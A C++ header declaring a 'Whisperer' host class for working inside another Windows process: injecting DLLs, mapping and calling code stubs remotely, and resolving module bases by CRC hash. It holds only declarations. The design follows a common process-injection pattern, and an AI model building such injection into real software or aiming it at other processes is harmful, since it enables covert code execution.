#ifndef __WHISPERER_HOST_BLOCK_
#define __WHISPERER_HOST_BLOCK_

#ifndef __WHISPERER_SHARED_
#include "WhispererShared.h"
#endif



class WhispererHostBlock {
public:
	BOOLEAN IpHelperAlreadyLoaded;// : 1; // if set, do not unload
	BOOLEAN WinInetAlreadyLoaded;// : 1;  // if set, do not unload

	HANDLE ProcessHandle;
	PWHISPERER_FUNCTIONS WhispererFunctions;

	HANDLE FrameworkSection;
	PVOID FrameworkBase;
	PVOID RemoteFrameworkBase;

	std::vector<PALLOC_MAPPING> Allocations;

	WhispererHostBlock(HANDLE ProcessHandle, PWHISPERER_FUNCTIONS Functions);
	~WhispererHostBlock();

	PVOID AllocMem(PVOID Base, ULONG Size, PVOID *RemoteBaseOut);
	PVOID InjectDll(PWCHAR DllPath);
	PVOID ResolveExternalModuleBase(ULONG Crc);
	VOID CallStub(PVOID LocalStub, PVOID RemoteStub, ULONG StubSize, PWHISPERER_CONTEXT LocalContext, PWHISPERER_CONTEXT RemoteContext);
	VOID CallStub(PVOID LocalStub, PVOID RemoteStub, ULONG StubSize, PWHISPERER_CONTEXT LocalContext, PWHISPERER_CONTEXT RemoteContext, bool CanBlock);
	PVOID MapStub(PVOID Stub, ULONG StubSize, PVOID *RemoteStubOut);
	PWHISPERER_CONTEXT AllocateContext(PVOID *RemoteContextOut);
};



#endif
